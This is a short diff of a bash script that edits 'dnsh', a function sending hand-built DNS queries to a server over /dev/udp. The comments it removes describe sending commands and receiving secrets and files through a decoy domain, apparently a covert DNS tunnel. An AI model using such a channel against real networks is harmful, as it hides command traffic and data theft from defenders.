@@ -6,9 +6,6 @@ function spl() {
     printf '%s ' "${arr[@]}"
 }
 function dnsh() { 
-    # send cmd - dnsh snd cmd.arg.decoydomain.tld <ip>
-    # rcv cmd - dnsh rcv secret.decoydomain.tld <ip>
-    # rcv file - dnsh rcvf filename.ext.decoydomain.tld <ip>
     : ${DEBUG:=0}
 
     q=$1
@@ -24,11 +21,7 @@ function dnsh() {
     q="$tid$flags$qstr$qtyp"
     exec 5<>/dev/udp/$srv/53
     echo -n -e "$q" >&5 
-    #cat <&5 | hexdump -C
-    while read line; do
-        echo line
-    done < <&5
-    exec 5>&-
+    cat <&5 | hexdump -C
 }
 
 # pure bash b64
